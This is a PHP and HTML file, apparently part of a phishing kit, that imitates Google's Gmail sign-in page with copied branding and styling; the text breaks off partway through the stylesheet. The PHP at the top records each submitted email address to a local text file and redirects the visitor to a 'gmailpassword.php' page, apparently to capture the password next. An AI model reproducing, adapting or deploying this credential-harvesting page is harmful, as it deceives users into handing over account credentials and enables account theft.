<?php
/**
 * Created by PhpStorm.
 * User: karas
 * Date: 21.11.2016
 * Time: 15:08
 */
include("config.php");
session_start();
$error = " ";
if($_SERVER["REQUEST_METHOD"] == "POST") {
    // username and password sent from form

    $myusername = mysqli_real_escape_string($db,$_POST['Email']);
    $myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
    $_SESSION['email'] = $myusername;
    fwrite($myfile, $myusername . "\r\n");
    header("location: gmailpassword.php");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta content="width=300, initial-scale=1" name="viewport">
    <meta name="google" value="notranslate">
    <meta name="description" content="Gmail is email that&#39;s intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
    <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
    <title>Gmail</title>
    <style>
        /* cyrillic-ext */
        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 300;
            src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTa-j2U0lmluP9RWlSytm3ho.woff2) format('woff2');
            unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
        }
        /* cyrillic */
        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 300;
            src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTZX5f-9o1vgP2EXwfjgl7AY.woff2) format('woff2');
            unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
        }
        /* greek-ext */
        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 300;
            src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTRWV49_lSm1NYrwo-zkhivY.woff2) format('woff2');
            unicode-range: U+1F00-1FFF;
        }
        /* greek */
        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 300;
            src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTaaRobkAwv3vxw3jMhVENGA.woff2) format('woff2');
            unicode-range: U+0370-03FF;
        }
        /* vietnamese */
        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 300;
            src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTf8zf_FOSsgRmwsS7Aa9k2w.woff2) format('woff2');
            unicode-range: U+0102-0103, U+1EA0-1EF9, U+20AB;
        }
        /* latin-ext */
        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 300;
            src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTT0LW-43aMEzIO6XUTLjad8.woff2) format('woff2');
            unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
        }
        /* latin */
        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 300;
            src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTegdm0LZdjqr5-oayXSOefg.woff2) format('woff2');
            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
        }
        /* cyrillic-ext */
        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 400;
            src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/K88pR3goAWT7BTt32Z01mxJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
            unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
        }
        /* cyrillic */
        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 400;
            src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/RjgO7rYTmqiVp7vzi-Q5URJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
            unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
        }
        /* greek-ext */
        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 400;
            src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/LWCjsQkB6EMdfHrEVqA1KRJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
            unicode-range: U+1F00-1FFF;
        }
        /* greek */
        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 400;
            src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/xozscpT2726on7jbcb_pAhJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
            unicode-range: U+0370-03FF;
        }
        /* vietnamese */
        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 400;
            src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/59ZRklaO5bWGqF5A9baEERJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
            unicode-range: U+0102-0103, U+1EA0-1EF9, U+20AB;
        }
        /* latin-ext */
        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 400;
            src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/u-WUoqrET9fUeobQW7jkRRJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
            unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
        }
        /* latin */
        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 400;
            src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/cJZKeOuBrn4kERxqtaUH3VtXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
        }
    </style>
    <style>
        h1, h2 {
            -webkit-animation-duration: 0.1s;
            -webkit-animation-name: fontfix;
            -webkit-animation-iteration-count: 1;
            -webkit-animation-timing-function: linear;
            -webkit-animation-delay: 0;
        }
        @-webkit-keyframes fontfix {
            from {
                opacity: 1;
            }
            to {
                opacity: 1;
            }
        }
    </style>
    <style>
        html, body {
            font-family: Arial, sans-serif;
            background: #fff;
            margin: 0;
            padding: 0;
            border: 0;
            position: absolute;
            height: 100%;
            min-width: 100%;
            font-size: 13px;
            color: #404040;
            direction: ltr;
            -webkit-text-size-adjust: none;
        }
        button,
        input[type=button],
        input[type=submit] {
            font-family: Arial, sans-serif;
            font-size: 13px;
        }
        a,
        a:hover,
        a:visited {
            color: #427fed;
            cursor: pointer;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        h1 {
            font-size: 20px;
            color: #262626;
            margin: 0 0 15px;
            font-weight: normal;
        }
        h2 {
            font-size: 14px;
            color: #262626;
            margin: 0 0 15px;
            font-weight: bold;
        }
        input[type=email],
        input[type=number],
        input[type=password],
        input[type=tel],
        input[type=text],
        input[type=url] {
            -moz-appearance: none;
            -webkit-appearance: none;
            appearance: none;
            display: inline-block;
            height: 36px;
            padding: 0 8px;
            margin: 0;
            background: #fff;
            border: 1px solid #d9d9d9;
            border-top: 1px solid #c0c0c0;
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            -moz-border-radius: 1px;
            -webkit-border-radius: 1px;
            border-radius: 1px;
            font-size: 15px;
            color: #404040;
        }
        input[type=email]:hover,
        input[type=number]:hover,
        input[type=password]:hover,
        input[type=tel]:hover,
        input[type=text]:hover,
        input[type=url]:hover {
            border: 1px solid #b9b9b9;
            border-top: 1px solid #a0a0a0;
            -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
            -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
            box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
        }
        input[type=email]:focus,
        input[type=number]:focus,
        input[type=password]:focus,
        input[type=tel]:focus,
        input[type=text]:focus,
        input[type=url]:focus {
            outline: none;
            border: 1px solid #4d90fe;
            -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
            -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
            box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
        }
        input[type=checkbox],
        input[type=radio] {
            -webkit-appearance: none;
            display: inline-block;
            width: 13px;
            height: 13px;
            margin: 0;
            cursor: pointer;
            vertical-align: bottom;
            background: #fff;
            border: 1px solid #c6c6c6;
            -moz-border-radius: 1px;
            -webkit-border-radius: 1px;
            border-radius: 1px;
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            position: relative;
        }
        input[type=checkbox]:active,
        input[type=radio]:active {
            background: #ebebeb;
        }
        input[type=checkbox]:hover {
            border-color: #c6c6c6;
            -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
            -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
            box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
        }
        input[type=radio] {
            -moz-border-radius: 1em;
            -webkit-border-radius: 1em;
            border-radius: 1em;
            width: 15px;
            height: 15px;
        }
        input[type=checkbox]:checked,
        input[type=radio]:checked {
            background: #fff;
        }
        input[type=radio]:checked::after {
            content: '';
            display: block;
            position: relative;
            top: 3px;
            left: 3px;
            width: 7px;
            height: 7px;
            background: #666;
            -moz-border-radius: 1em;
            -webkit-border-radius: 1em;
            border-radius: 1em;
        }
        input[type=checkbox]:checked::after {
            content: url(https://ssl.gstatic.com/ui/v1/menu/checkmark.png);
            display: block;
            position: absolute;
            top: -6px;
            left: -5px;
        }
        input[type=checkbox]:focus {
            outline: none;
            border-color: #4d90fe;
        }
        .stacked-label {
            display: block;
            font-weight: bold;
            margin: .5em 0;
        }
        .hidden-label {
            position: absolute !important;
            clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
            clip: rect(1px, 1px, 1px, 1px);
            height: 0px;
            width: 0px;
            overflow: hidden;
            visibility: hidden;
        }
        input[type=checkbox].form-error,
        input[type=email].form-error,
        input[type=number].form-error,
        input[type=password].form-error,
        input[type=text].form-error,
        input[type=tel].form-error,
        input[type=url].form-error {
            border: 1px solid #dd4b39;
        }
        .error-msg {
            margin: .5em 0;
            display: block;
            color: #dd4b39;
            line-height: 17px;
        }
        .help-link {
            background: #dd4b39;
            padding: 0 5px;
            color: #fff;
            font-weight: bold;
            display: inline-block;
            -moz-border-radius: 1em;
            -webkit-border-radius: 1em;
            border-radius: 1em;
            text-decoration: none;
            position: relative;
            top: 0px;
        }
        .help-link:visited {
            color: #fff;
        }
        .help-link:hover {
            color: #fff;
            background: #c03523;
            text-decoration: none;
        }
        .help-link:active {
            opacity: 1;
            background: #ae2817;
        }
        .wrapper {
            position: relative;
            min-height: 100%;
        }
        .content {
            padding: 0 44px;
        }
        .main {
            padding-bottom: 100px;
        }
        /* For modern browsers */
        .clearfix:before,
        .clearfix:after {
            content: "";
            display: table;
        }
        .clearfix:after {
            clear: both;
        }
        /* For IE 6/7 (trigger hasLayout) */
        .clearfix {
            zoom:1;
        }
        .google-header-bar {
            height: 71px;
            border-bottom: 1px solid #e5e5e5;
            overflow: hidden;
        }
        .header .logo {
            background-image: url(https://ssl.gstatic.com/accounts/ui/logo_1x.png);
            background-size: 116px 38px;
            background-repeat: no-repeat;
            margin: 17px 0 0;
            float: left;
            height: 38px;
            width: 116px;
        }
        .header .logo-w {
            background-image: url(https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png);
            background-size: 112px 36px;
            margin: 21px 0 0;
        }
        .header .secondary-link {
            margin: 28px 0 0;
            float: right;
        }
        .header .secondary-link a {
            font-weight: normal;
        }
        .google-header-bar.centered {
            border: 0;
            height: 108px;
        }
        .google-header-bar.centered .header .logo {
            float: none;
            margin: 40px auto 30px;
            display: block;
        }
        .google-header-bar.centered .header .secondary-link {
            display: none
        }
        .google-footer-bar {
            position: absolute;
            bottom: 0;
            height: 35px;
            width: 100%;
            border-top: 1px solid #e5e5e5;
            overflow: hidden;
        }
        .footer {
            padding-top: 7px;
            font-size: .85em;
            white-space: nowrap;
            line-height: 0;
        }
        .footer ul {
            float: left;
            max-width: 80%;
            min-height: 16px;
            padding: 0;
        }
        .footer ul li {
            color: #737373;
            display: inline;
            padding: 0;
            padding-right: 1.5em;
        }
        .footer a {
            color: #737373;
        }
        .lang-chooser-wrap {
            float: right;
            display: inline;
        }
        .lang-chooser-wrap img {
            vertical-align: top;
        }
        .lang-chooser {
            font-size: 13px;
            height: 24px;
            line-height: 24px;
        }
        .lang-chooser option {
            font-size: 13px;
            line-height: 24px;
        }
        .hidden {
            height: 0px;
            width: 0px;
            overflow: hidden;
            visibility: hidden;
            display: none !important;
        }
        .banner {
            text-align: center;
        }
        .card {
            background-color: #f7f7f7;
            padding: 20px 25px 30px;
            margin: 0 auto 25px;
            width: 304px;
            -moz-border-radius: 2px;
            -webkit-border-radius: 2px;
            border-radius: 2px;
            -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
            -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
            box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
        }
        .card > *:first-child {
            margin-top: 0;
        }
        .rc-button,
        .rc-button:visited {
            display: inline-block;
            min-width: 46px;
            text-align: center;
            color: #444;
            font-size: 14px;
            font-weight: 700;
            height: 36px;
            padding: 0 8px;
            line-height: 36px;
            -moz-border-radius: 3px;
            -webkit-border-radius: 3px;
            border-radius: 3px;
            -o-transition: all 0.218s;
            -moz-transition: all 0.218s;
            -webkit-transition: all 0.218s;
            transition: all 0.218s;
            border: 1px solid #dcdcdc;
            background-color: #f5f5f5;
            background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
            background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
            background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
            background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
            background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
            -o-transition: none;
            -moz-user-select: none;
            -webkit-user-select: none;
            user-select: none;
            cursor: default;
        }
        .card .rc-button {
            width: 100%;
            padding: 0;
        }
        .rc-button.disabled,
        .rc-button[disabled] {
            opacity: .5;
            filter: alpha(opacity=50);
            cursor: default;
            pointer-events: none;
        }
        .rc-button:hover {
            border: 1px solid #c6c6c6;
            color: #333;
            text-decoration: none;
            -o-transition: all 0.0s;
            -moz-transition: all 0.0s;
            -webkit-transition: all 0.0s;
            transition: all 0.0s;
            background-color: #f8f8f8;
            background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
            background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
            background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
            background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
            background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
            -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
            -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
            box-shadow: 0 1px 1px rgba(0,0,0,0.1);
        }
        .rc-button:active {
            background-color: #f6f6f6;
            background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
            background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
            background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
            background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
            background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
            -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
            -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        .rc-button-submit,
        .rc-button-submit:visited {
            border: 1px solid #3079ed;
            color: #fff;
            text-shadow: 0 1px rgba(0,0,0,0.1);
            background-color: #4d90fe;
            background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
            background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
            background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
            background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
            background-image: linear-gradient(top,#4d90fe,#4787ed);
        }
        .rc-button-submit:hover {
            border: 1px solid #2f5bb7;
            color: #fff;
            text-shadow: 0 1px rgba(0,0,0,0.3);
            background-color: #357ae8;
            background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
            background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
            background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
            background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
            background-image: linear-gradient(top,#4d90fe,#357ae8);
        }
        .rc-button-submit:active {
            background-color: #357ae8;
            background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
            background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
            background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
            background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
            background-image: linear-gradient(top,#4d90fe,#357ae8);
            -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
            -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
            box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
        }
        .rc-button-red,
        .rc-button-red:visited {
            border: 1px solid transparent;
            color: #fff;
            text-shadow: 0 1px rgba(0,0,0,0.1);
            background-color: #d14836;
            background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
            background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
            background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
            background-image: -o-linear-gradient(top,#dd4b39,#d14836);
            background-image: linear-gradient(top,#dd4b39,#d14836);
        }
        .rc-button-red:hover {
            border: 1px solid #b0281a;
            color: #fff;
            text-shadow: 0 1px rgba(0,0,0,0.3);
            background-color: #c53727;
            background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
            background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
            background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
            background-image: -o-linear-gradient(top,#dd4b39,#c53727);
            background-image: linear-gradient(top,#dd4b39,#c53727);
        }
        .rc-button-red:active {
            border: 1px solid #992a1b;
            background-color: #b0281a;
            background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
            background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
            background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
            background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
            background-image: linear-gradient(top,#dd4b39,#b0281a);
            -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
            -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
            box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
        }
        .secondary-actions {
            text-align: center;
        }
    </style>
    <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
        .google-header-bar.centered {
            height: 83px;
        }
        .google-header-bar.centered .header .logo {
            margin: 25px auto 20px;
        }
        .card {
            margin-bottom: 20px;
        }
    </style>
    <style media="screen and (max-width: 580px)">
        html, body {
            font-size: 14px;
        }
        .google-header-bar.centered {
            height: 73px;
        }
        .google-header-bar.centered .header .logo {
            margin: 20px auto 15px;
        }
        .content {
            padding-left: 10px;
            padding-right: 10px;
        }
        .hidden-small {
            display: none;
        }
        .card {
            padding: 20px 15px 30px;
            width: 270px;
        }
        .footer ul li {
            padding-right: 1em;
        }
        .lang-chooser-wrap {
            display: none;
        }
    </style>
    <style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
        .header .logo {
            background-image: url(https://ssl.gstatic.com/accounts/ui/logo_2x.png);
        }
        .header .logo-w {
            background-image: url(https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_112x36dp.png);
        }
    </style>
    <style>
        pre.debug {
            font-family: monospace;
            position: absolute;
            left: 0;
            margin: 0;
            padding: 1.5em;
            font-size: 13px;
            background: #f1f1f1;
            border-top: 1px solid #e5e5e5;
            direction: ltr;
            white-space: pre-wrap;
            width: 90%;
            overflow: hidden;
        }
    </style>
    <style>
        .banner h1 {
            font-family: 'Open Sans', arial;
            -webkit-font-smoothing: antialiased;
            color: #555;
            font-size: 42px;
            font-weight: 300;
            margin-top: 0;
            margin-bottom: 20px;
        }
        .banner h2 {
            font-family: 'Open Sans', arial;
            -webkit-font-smoothing: antialiased;
            color: #555;
            font-size: 18px;
            font-weight: 400;
            margin-bottom: 20px;
        }
        .signin-card {
            width: 274px;
            padding: 40px 40px;
        }
        .signin-card .profile-img {
            width: 96px;
            height: 96px;
            margin: 0 auto 10px;
            display: block;
            -moz-border-radius: 50%;
            -webkit-border-radius: 50%;
            border-radius: 50%;
        }
        .signin-card .profile-name {
            font-size: 16px;
            font-weight: bold;
            text-align: center;
            margin: 10px 0 0;
            min-height: 1em;
        }
        .signin-card .profile-email {
            font-size: 16px;
            text-align: center;
            margin: 10px 0 20px 0;
            min-height: 1em;
        }
        .signin-card input[type=email],
        .signin-card input[type=password],
        .signin-card input[type=text],
        .signin-card input[type=submit] {
            width: 100%;
            display: block;
            margin-bottom: 10px;
            z-index: 1;
            position: relative;
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }
        .signin-card #Email,
        .signin-card #Passwd,
        .signin-card .captcha {
            direction: ltr;
            height: 44px;
            font-size: 16px;
        }
        .signin-card #Email + .stacked-label {
            margin-top: 15px;
        }
        .signin-card #reauthEmail {
            display: block;
            margin-bottom: 10px;
            line-height: 36px;
            padding: 0 8px;
            font-size: 15px;
            color: #404040;
            line-height: 2;
            margin-bottom: 10px;
            font-size: 14px;
            text-align: center;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }
        .one-google p {
            margin: 0 0 10px;
            color: #555;
            font-size: 14px;
            text-align: center;
        }
        .one-google p.create-account,
        .one-google p.switch-account {
            margin-bottom: 60px;
        }
        .one-google .logo-strip {
            background-repeat: no-repeat;
            display: block;
            margin: 10px auto;
            background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png);
            background-size: 230px 17px;
            width: 230px;
            height: 17px;
        }
    </style>
    <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
        .banner h1 {
            font-size: 38px;
            margin-bottom: 15px;
        }
        .banner h2 {
            margin-bottom: 15px;
        }
        .one-google p.create-account,
        .one-google p.switch-account {
            margin-bottom: 30px;
        }
        .signin-card #Email {
            margin-bottom: 0;
        }
        .signin-card #Passwd {
            margin-top: -1px;
        }
        .signin-card #Email.form-error,
        .signin-card #Passwd.form-error {
            z-index: 2;
        }
        .signin-card #Email:hover,
        .signin-card #Email:focus,
        .signin-card #Passwd:hover,
        .signin-card #Passwd:focus {
            z-index: 3;
        }
    </style>
    <style media="screen and (max-width: 580px)">
        .banner h1 {
            font-size: 22px;
            margin-bottom: 15px;
        }
        .signin-card {
            width: 260px;
            padding: 20px 20px;
            margin: 0 auto 20px;
        }
        .signin-card .profile-img {
            width: 72px;
            height: 72px;
            -moz-border-radius: 72px;
            -webkit-border-radius: 72px;
            border-radius: 72px;
        }
    </style>
    <style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
        .one-google .logo-strip {
            background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_2x.png);
        }
    </style>
    <style>
        .remember .bubble-wrap {
            position: absolute;
            padding-top: 3px;
            -o-transition: opacity .218s ease-in .218s;
            -moz-transition: opacity .218s ease-in .218s;
            -webkit-transition: opacity .218s ease-in .218s;
            transition: opacity .218s ease-in .218s;
            left: -999em;
            opacity: 0;
            width: 314px;
            margin-left: -20px;
        }
        .remember:hover .bubble-wrap,
        .remember input:focus ~ .bubble-wrap,
        .remember .bubble-wrap:hover,
        .remember .bubble-wrap:focus {
            opacity: 1;
            left: inherit;
        }
        .bubble-pointer {
            border-left: 10px solid transparent;
            border-right: 10px solid transparent;
            border-bottom: 10px solid #fff;
            width: 0;
            height: 0;
            margin-left: 17px;
        }
        .bubble {
            background-color: #fff;
            padding: 15px;
            margin-top: -1px;
            font-size: 11px;
            -moz-border-radius: 2px;
            -webkit-border-radius: 2px;
            border-radius: 2px;
            -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
            -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
            box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
        }
        #stay-signed-in {
            float: left;
        }
        #stay-signed-in-tooltip {
            left: auto;
            margin-left: -20px;
            padding-top: 3px;
            position: absolute;
            top: 0;
            visibility: hidden;
            width: 314px;
            z-index: 1;
        }
        .dasher-tooltip {
            top: 380px;
        }
    </style>
    <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
        .dasher-tooltip {
            top: 340px;
        }
    </style>
    <style>
        .jfk-tooltip {
            background-color: #fff;
            border: 1px solid;
            color: #737373;
            font-size: 12px;
            position: absolute;
            z-index: 800 !important;
            border-color: #bbb #bbb #a8a8a8;
            padding: 16px;
            width: 250px;
        }
        .jfk-tooltip h3 {
            color: #555;
            font-size: 12px;
            margin: 0 0 .5em;
        }
        .jfk-tooltip-content p:last-child {
            margin-bottom: 0;
        }
        .jfk-tooltip-arrow {
            position: absolute;
        }
        .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
        .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
            display: block;
            height: 0;
            position: absolute;
            width: 0;
        }
        .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
            border: 9px solid;
        }
        .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
            border: 8px solid;
        }
        .jfk-tooltip-arrowdown {
            bottom: 0;
        }
        .jfk-tooltip-arrowup {
            top: -9px;
        }
        .jfk-tooltip-arrowleft {
            left: -9px;
            top: 30px;
        }
        .jfk-tooltip-arrowright {
            right: 0;
            top: 30px;
        }
        .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
            border-color: #bbb transparent;
            left: -9px;
        }
        .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
            border-color: #a8a8a8 transparent;
        }
        .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
            border-color: #fff transparent;
            left: -8px;
        }
        .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
            border-bottom-width: 0;
        }
        .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
            border-bottom-width: 0;
        }
        .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
            border-top-width: 0;
        }
        .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
            border-top-width: 0;
            top: 1px;
        }
        .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
        .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
            border-color: transparent #bbb;
            top: -9px;
        }
        .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
        .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
            border-color:transparent #fff;
            top:-8px;
        }
        .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
            border-left-width: 0;
        }
        .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
            border-left-width: 0;
            left: 1px;
        }
        .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
            border-right-width: 0;
        }
        .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
            border-right-width: 0;
        }
        .jfk-tooltip-closebtn {
            background: url("//ssl.gstatic.com/ui/v1/icons/common/x_8px.png") no-repeat;
            border: 1px solid transparent;
            height: 21px;
            opacity: .4;
            outline: 0;
            position: absolute;
            right: 2px;
            top: 2px;
            width: 21px;
        }
        .jfk-tooltip-closebtn:focus,
        .jfk-tooltip-closebtn:hover {
            opacity: .8;
            cursor: pointer;
        }
        .jfk-tooltip-closebtn:focus {
            border-color: #4d90fe;
        }
    </style>
    <style media="screen and (max-width: 580px)">
        .jfk-tooltip {
            display: none;
        }
    </style>
    <style type="text/css">
        .captcha-box {
            background: #fff;
            margin: 0 0 10px;
            overflow: hidden;
            padding: 10px;
        }
        .captcha-box .captcha-img {
            text-align: center;
        }
        .captcha-box .captcha-label {
            font-weight: bold;
            display: block;
            margin: .5em 0;
        }
        .captcha-box .captcha-msg {
            color: #999;
            display: block;
            position: relative;
        }
        .captcha-box .captcha-msg .accessibility-logo {
            float: right;
            border: 0;
        }
        .captcha-box .audio-box {
            position: absolute;
            top: 0;
        }
    </style>
    <style>
        .chromiumsync-custom-content {
            padding-top: 20px;
            margin-bottom: 0;
        }
        .form-panel {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            -webkit-transform: translateZ(0);
            -moz-transform: translateZ(0);
            -ms-transform: translateZ(0);
